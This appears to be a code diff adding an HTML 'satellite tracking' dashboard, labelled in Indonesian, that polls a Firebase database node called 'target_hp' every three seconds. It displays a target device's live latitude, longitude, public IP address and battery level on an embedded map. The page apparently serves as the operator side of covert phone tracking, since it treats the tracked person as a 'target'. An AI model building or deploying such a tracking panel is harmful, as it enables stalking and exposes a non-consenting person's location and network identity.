@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HQ Monitoring Dashboard</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; margin: 0; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+        .card { background: #141414; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .map-container { height: 450px; width: 100%; border-radius: 8px; overflow: hidden; border: 1px solid #00ff41; background: #000; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
+        .data-item { margin: 12px 0; font-size: 13px; display: flex; justify-content: space-between; border-bottom: 1px dashed #222; padding-bottom: 5px; }
+        .label { color: #00ff41; font-weight: bold; }
+        .value { color: #fff; }
+        .status-online { display: inline-block; width: 10px; height: 10px; background: #00ff41; border-radius: 50%; box-shadow: 0 0 8px #00ff41; animation: blink 1s infinite; margin-right: 10px; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div style="display: flex; align-items: center; margin-bottom: 20px;">
+    <span class="status-online"></span>
+    <h1 style="font-size: 20px; margin: 0;">SATELLITE TRACKING INTERFACE</h1>
+</div>
+
+<div class="grid">
+    <div class="card">
+        <h2>LIVE VISUALIZATION</h2>
+        <div class="map-container" id="mapBox">
+            <p style="text-align:center; padding-top:180px;">MENGHUBUNGKAN KE DATA...</p>
+        </div>
+    </div>
+    <div class="card">
+        <h2>TARGET DATA</h2>
+        <div class="data-item"><span class="label">LAST UPDATE</span> <span class="value" id="time">-</span></div>
+        <div class="data-item"><span class="label">LATITUDE</span> <span class="value" id="lat">-</span></div>
+        <div class="data-item"><span class="label">LONGITUDE</span> <span class="value" id="lon">-</span></div>
+        <div class="data-item"><span class="label">IP PUBLIC</span> <span class="value" id="ip">-</span></div>
+        <div class="data-item"><span class="label">BATTERY</span> <span class="value" id="battery">-</span></div>
+        <div class="data-item"><span class="label">STATUS</span> <span class="value" id="status">-</span></div>
+        <hr border="0" style="border-top:1px solid #333; margin: 15px 0;">
+        <button onclick="location.reload()" style="background:#00ff41; color:#000; border:none; padding:15px; width:100%; cursor:pointer; font-weight:bold; border-radius: 5px;">RESTART MONITOR</button>
+    </div>
+</div>
+
+<script>
+    const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/target_hp.json";
+
+    function fetchData() {
+        fetch(DB_URL)
+        .then(res => res.json())
+        .then(data => {
+            if (data) {
+                document.getElementById('time').innerText = data.updated_at;
+                document.getElementById('lat').innerText = data.lat;
+                document.getElementById('lon').innerText = data.lon;
+                document.getElementById('ip').innerText = data.ip;
+                document.getElementById('battery').innerText = data.battery;
+                document.getElementById('status').innerText = data.status;
+
+                const mapURL = `https://maps.google.com/maps?q=${data.lat},${data.lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
+                const mapBox = document.getElementById('mapBox');
+                if (mapBox.innerHTML.indexOf('iframe') === -1 || mapBox.dataset.lat != data.lat) {
+                    mapBox.innerHTML = `<iframe src="${mapURL}"></iframe>`;
+                    mapBox.dataset.lat = data.lat;
+                }
+            }
+        });
+    }
+    setInterval(fetchData, 3000);
+    window.onload = fetchData;
+</script>
+</body>
+</html>
